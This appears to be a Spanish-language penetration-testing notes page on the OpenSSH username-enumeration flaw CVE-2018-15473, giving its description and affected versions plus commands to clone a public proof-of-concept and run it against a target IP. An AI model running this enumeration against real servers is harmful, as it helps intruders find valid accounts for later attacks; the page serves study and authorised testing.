---
layout: default
title: 22 - SSH
---
### 📌 **OpenSSH < 7.7 (CVE-2018-15473)**

- **CVE:** [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/CVE-2018-15473)
    
- **Descripción:** La vulnerabilidad permitía distinguir usuarios válidos de inválidos por la respuesta que devuelve el servidor cuando falla la autenticación pública.
    
- **Afectados:** Todas las versiones **anteriores a OpenSSH 7.7**, lanzado en abril de 2018.
    
- **Exploit famoso:** `ssh-user-enum` y scripts en Metasploit.

```
git clone https://github.com/Sait-Nuri/CVE-2018-15473.git
```

```bash
python3 -m venv venv
source venv/bin/activate
pip install paramiko==2.7.2 --break-system-packages
python CVE-2018-15473.py IP -u fwefergerg 2>/dev/null #Probar FP
```